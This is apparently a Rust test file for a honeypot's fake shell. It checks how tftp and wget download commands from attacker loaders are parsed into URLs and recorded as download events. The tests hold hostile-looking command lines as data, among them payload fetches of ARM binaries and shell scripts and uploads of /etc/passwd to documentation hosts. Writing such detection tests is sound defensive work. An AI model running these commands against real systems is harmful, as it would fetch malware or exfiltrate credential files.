//! `tftp` download extraction. Every row is a command line a loader can plausibly run; the
//! expected value is the URL the review fetcher may be handed, or no URL at all. Hosts are RFC 5737
//! and RFC 3849 documentation addresses.

use super::{EmitContext, FakeShell, Fetch, fetch_attempt};
use crate::fakefs::FakeFs;
use sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "telnet".to_string(),
        session_id: None,
    }
}

fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

/// What the line fetches: `Some(Ok(url))`, `Some(Err(raw))` for an unparsed fetch, `None` when the
/// line is not a fetch at all.
fn attempt(line: &str) -> Option<Result<String, String>> {
    let tokens: Vec<&str> = line.split_whitespace().collect();
    fetch_attempt(&tokens).map(|f| match f {
        Fetch::Url(u) => Ok(u),
        Fetch::Unparsed(raw) => Err(raw),
    })
}

fn url(line: &str) -> Option<String> {
    attempt(line).and_then(Result::ok)
}

#[test]
fn every_common_form_parses_to_host_port_and_file() {
    let table: &[(&str, &str)] = &[
        // Classic tftp-hpa, the server first. The `-c get` pair was once read as host + port.
        (
            "tftp 198.51.100.9 -c get tftp2.sh",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp 198.51.100.9 -c get tftp2.sh local.sh",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp 198.51.100.9 6969 -c get x.bin",
            "tftp://198.51.100.9:6969/x.bin",
        ),
        (
            "tftp -v 198.51.100.9 -m binary -c get x.bin",
            "tftp://198.51.100.9/x.bin",
        ),
        ("tftp 198.51.100.9 -cget x.bin", "tftp://198.51.100.9/x.bin"),
        // The server last, or inside the file argument.
        (
            "tftp -c get tftp2.sh 198.51.100.9",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp -c get tftp2.sh local.sh 198.51.100.9",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp -c get 198.51.100.9:tftp2.sh",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp -c get tftp.example.org:a/b.sh",
            "tftp://tftp.example.org/a/b.sh",
        ),
        // BusyBox, in every flag order.
        ("tftp -g -r x.arm 198.51.100.9", "tftp://198.51.100.9/x.arm"),
        ("tftp -g 198.51.100.9 -r x.arm", "tftp://198.51.100.9/x.arm"),
        ("tftp -r x.arm -g 198.51.100.9", "tftp://198.51.100.9/x.arm"),
        ("tftp -gr x.arm 198.51.100.9", "tftp://198.51.100.9/x.arm"),
        ("tftp -rx.arm -g 198.51.100.9", "tftp://198.51.100.9/x.arm"),
        (
            "tftp -g -r x.arm -l /tmp/y 198.51.100.9 6969",
            "tftp://198.51.100.9:6969/x.arm",
        ),
        (
            "tftp -g -r x.arm 198.51.100.9 tftp",
            "tftp://198.51.100.9/x.arm",
        ),
        (
            "tftp -g -l local.bin 198.51.100.9",
            "tftp://198.51.100.9/local.bin",
        ),
        (
            "tftp -g -b 512 -r /bins/x.arm 198.51.100.9",
            "tftp://198.51.100.9/bins/x.arm",
        ),
        (
            "busybox tftp -g -r x.arm 198.51.100.9",
            "tftp://198.51.100.9/x.arm",
        ),
        (
            "/bin/busybox tftp -g -r tftp2.sh 198.51.100.9",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        // Names as the server.
        (
            "tftp -g -r x.arm files.example.org",
            "tftp://files.example.org/x.arm",
        ),
        // IPv6 in brackets, bare, with a port, and in the file argument.
        (
            "tftp -g -r x.arm [2001:db8::1]",
            "tftp://[2001:db8::1]/x.arm",
        ),
        ("tftp -g -r x.arm 2001:db8::1", "tftp://[2001:db8::1]/x.arm"),
        (
            "tftp -g -r x.arm [2001:db8::1] 6969",
            "tftp://[2001:db8::1]:6969/x.arm",
        ),
        (
            "tftp -g -r x.arm [2001:db8::1]:6969",
            "tftp://[2001:db8::1]:6969/x.arm",
        ),
        (
            "tftp [2001:db8::1] -c get x.arm",
            "tftp://[2001:db8::1]/x.arm",
        ),
        (
            "tftp -c get [2001:db8::1]:x.arm",
            "tftp://[2001:db8::1]/x.arm",
        ),
        (
            "tftp -c get x.arm 2001:db8::1",
            "tftp://[2001:db8::1]/x.arm",
        ),
        // Quotes and escapes around any argument.
        (
            "tftp -g -r 'x.arm' \"198.51.100.9\"",
            "tftp://198.51.100.9/x.arm",
        ),
        (
            "tftp 198.51.100.9 -c get \"tftp2.sh\"",
            "tftp://198.51.100.9/tftp2.sh",
        ),
        (
            "tftp -g -r x\\.arm 198.51.100.9",
            "tftp://198.51.100.9/x.arm",
        ),
    ];
    for (line, expected) in table {
        assert_eq!(url(line).as_deref(), Some(*expected), "{line}");
    }
}

/// The failing line seen live: the shell recorded `tftp://<host>:get`, with `-c get` taken for a
/// port and the file name lost.
#[test]
fn classic_dash_c_get_is_not_a_port() {
    let line = "tftp 198.51.100.9 -c get tftp2.sh";
    let got = url(line).unwrap();
    assert!(!got.contains(":get"), "{got}");
    assert_eq!(got, "tftp://198.51.100.9/tftp2.sh");
}

#[test]
fn an_upload_is_not_a_download() {
    for line in [
        "tftp -p -l /etc/passwd 198.51.100.9",
        "tftp -p -r loot.bin -l /etc/passwd 198.51.100.9",
        "tftp 198.51.100.9 -c put /etc/passwd",
        "busybox tftp -p -l x 198.51.100.9",
    ] {
        assert_eq!(attempt(line), None, "{line}");
    }
}

#[test]
fn a_command_line_that_cannot_be_read_yields_no_url() {
    let table: &[&str] = &[
        // No file.
        "tftp -g 198.51.100.9",
        "tftp 198.51.100.9 -c get",
        // No server.
        "tftp -g -r x.arm",
        "tftp -c get x.arm",
        "tftp -c get x.arm y.arm",
        // A server that is not an address or a name.
        "tftp -g -r x.arm 198.51.100.999",
        "tftp -g -r x.arm 1.2.3",
        "tftp -g -r x.arm [2001:db8::zz]",
        "tftp -g -r x.arm [198.51.100.9]",
        "tftp -g -r x.arm host_name!",
        // A port out of range or not a port.
        "tftp -g -r x.arm 198.51.100.9 99999",
        "tftp -g -r x.arm 198.51.100.9 0",
        "tftp -g -r x.arm 198.51.100.9 eleven",
        "tftp -g -r x.arm 198.51.100.9:6969 6970",
        // A file name that would change the meaning of a URL.
        "tftp -g -r a?b 198.51.100.9",
        "tftp -g -r a#b 198.51.100.9",
        "tftp -g -r a%2fb 198.51.100.9",
        "tftp -g -r / 198.51.100.9",
        // An unclosed quote: the whitespace split cut a quoted name apart.
        "tftp -g -r \"my file\" 198.51.100.9",
        // A tftp prompt command that is not `get`.
        "tftp 198.51.100.9 -c mget *",
        "tftp 198.51.100.9 -c binary",
    ];
    for line in table {
        assert_eq!(
            attempt(line),
            Some(Err(line.to_string())),
            "unparsed fetch must carry the raw command: {line}"
        );
    }
}

/// Independent oracle for "this URL is safe to hand the fetcher": it does not reuse the parser's
/// host or file rules, only the URL grammar.
fn well_formed_tftp_url(u: &str) -> bool {
    let Some(rest) = u.strip_prefix("tftp://") else {
        return false;
    };
    let Some((authority, path)) = rest.split_once('/') else {
        return false;
    };
    if path.is_empty()
        || path
            .chars()
            .any(|c| "?#% \t\r\n\\\"'".contains(c) || c.is_control())
    {
        return false;
    }
    let (host, port) = if let Some(inner) = authority.strip_prefix('[') {
        let Some((h, p)) = inner.split_once(']') else {
            return false;
        };
        if h.parse::<std::net::Ipv6Addr>().is_err() {
            return false;
        }
        (h, p.strip_prefix(':'))
    } else {
        match authority.split_once(':') {
            Some((h, p)) => (h, Some(p)),
            None => (authority, None),
        }
    };
    if let Some(p) = port
        && !matches!(p.parse::<u16>(), Ok(n) if n > 0)
    {
        return false;
    }
    !host.is_empty() && !host.contains(['[', ']', '@', ' '])
}

#[test]
fn a_url_is_never_malformed_whatever_the_arguments() {
    let hosts = [
        "198.51.100.9",
        "198.51.100.999",
        "[2001:db8::1]",
        "2001:db8::1",
        "[2001:db8::1",
        "host.example",
        "ho st",
        "get",
        "-c",
        "",
        "a:b:c",
        "198.51.100.9:",
        "198.51.100.9:0",
        "198.51.100.9:70000",
        "@evil.example",
        "198.51.100.9@evil.example",
    ];
    let files = [
        "x.arm", "/x", "a/../b", "a?b", "a#b", "%2e", "-c", "get", ":", "h:f", "\"q", "a\\b",
        "x y", "get",
    ];
    let mut produced = 0;
    for h in hosts {
        for f in files {
            let lines = [
                format!("tftp {h} -c get {f}"),
                format!("tftp -c get {f} {h}"),
                format!("tftp -c get {h}:{f}"),
                format!("tftp -g -r {f} {h}"),
                format!("tftp -g {h} -r {f}"),
                format!("tftp -g -r {f} {h} {f}"),
            ];
            for line in lines {
                if let Some(Ok(u)) = attempt(&line) {
                    produced += 1;
                    assert!(well_formed_tftp_url(&u), "{line} -> {u}");
                }
            }
        }
    }
    assert!(produced > 20, "the corpus must produce URLs to check");
}

fn downloads(events: &[sensor_wire::SensorEvent]) -> Vec<&sensor_wire::SensorEvent> {
    events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .collect()
}

#[test]
fn the_observed_classic_line_emits_a_correct_download_event() {
    let mut sh = shell();
    let (_out, events) = sh.handle_input("tftp 198.51.100.9 -c get tftp2.sh");
    let dl = downloads(&events);
    assert_eq!(dl.len(), 1);
    assert_eq!(dl[0].metadata["url"], "tftp://198.51.100.9/tftp2.sh");
}

/// The persona has no bare `tftp` (the recorded Ubuntu image lacks it), so the classic line is
/// answered "not found" while the attempt is still recorded: the capture does not depend on the
/// persona having the command.
#[test]
fn the_classic_line_is_recorded_though_the_persona_has_no_such_command() {
    let mut sh = shell();
    let (out, events) = sh.handle_input("tftp 198.51.100.9 -c get tftp2.sh");
    assert!(out.contains("not found"), "{out}");
    assert_eq!(downloads(&events).len(), 1);
}

#[test]
fn a_busybox_download_saves_under_the_local_name_and_an_upload_saves_nothing() {
    let mut sh = shell();
    sh.handle_input("cd /tmp");
    sh.handle_input("busybox tftp -g -r remote.sh -l local.sh 198.51.100.9");
    sh.handle_input("busybox tftp -p -l sent.sh 198.51.100.9");
    assert_eq!(sh.handle_input("ls /tmp").0, "local.sh\n");
}

#[test]
fn an_unreadable_fetch_emits_the_raw_command_and_no_url() {
    let mut sh = shell();
    let (_out, events) = sh.handle_input("tftp -g 198.51.100.9");
    let dl = downloads(&events);
    assert_eq!(dl.len(), 1);
    assert!(dl[0].metadata.get("url").is_none(), "{:?}", dl[0].metadata);
    assert_eq!(dl[0].metadata["command"], "tftp -g 198.51.100.9");
}

#[test]
fn an_upload_emits_no_download_event() {
    let mut sh = shell();
    let (_out, events) = sh.handle_input("tftp -p -l /etc/passwd 198.51.100.9");
    assert!(downloads(&events).is_empty());
    let (_out, events) = sh.handle_input("tftp 198.51.100.9 -c put /etc/passwd");
    assert!(downloads(&events).is_empty());
}

#[test]
fn a_chain_with_one_unreadable_tftp_still_records_the_wget_url() {
    let mut sh = shell();
    let (_out, events) = sh.handle_input(
        "tftp -g 198.51.100.9; wget http://198.51.100.9/a.sh; tftp -p -l x 198.51.100.9",
    );
    let dl = downloads(&events);
    assert_eq!(dl.len(), 2);
    assert!(dl[0].metadata.get("url").is_none());
    assert_eq!(dl[1].metadata["url"], "http://198.51.100.9/a.sh");
}
